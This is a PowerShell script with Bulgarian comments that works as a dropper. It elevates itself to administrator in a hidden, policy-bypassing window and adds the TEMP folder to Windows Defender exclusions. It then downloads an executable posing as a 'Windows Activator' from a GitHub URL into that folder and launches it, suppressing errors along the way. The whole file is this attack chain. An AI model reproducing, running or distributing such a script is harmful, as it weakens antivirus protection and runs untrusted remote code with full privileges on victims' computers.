# ============================================
# АВТОМАТИЧЕН СКРИПТ: ИЗКЛЮЧЕНИЕ + СВАЛЯНЕ + СТАРТИРАНЕ
# ============================================

# Превключване към администратор ако е нужно
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptContent = @'
    $ErrorActionPreference = "SilentlyContinue"
    
    # Добавяне на изключение
    Add-MpPreference -ExclusionPath $env:TEMP
    
    # Сваляне на файла
    $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
    $file = "$env:TEMP\Microsoft_Activator.exe"
    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
    
    # Стартиране
    if (Test-Path $file) {
        Start-Process $file
    }
'@
    
    $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
    $scriptContent | Set-Content $tempFile -Encoding UTF8
    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# ============================================
# КОД ЗА АДМИНИСТРАТОР
# ============================================
$ErrorActionPreference = "SilentlyContinue"

# 1. Добавяне на изключение
Add-MpPreference -ExclusionPath $env:TEMP
Start-Sleep 1

# 2. Сваляне на файла
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$file = "$env:TEMP\Microsoft_Activator.exe"

# Премахване на стар файл ако съществува
if (Test-Path $file) { Remove-Item $file -Force }

Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
Start-Sleep 2

# 3. Стартиране на файла
if (Test-Path $file) {
    Start-Process $file
    Write-Host "Файлът е стартиран" -ForegroundColor Green
} else {
    Write-Host "Файлът не е изтеглен" -ForegroundColor Red
}
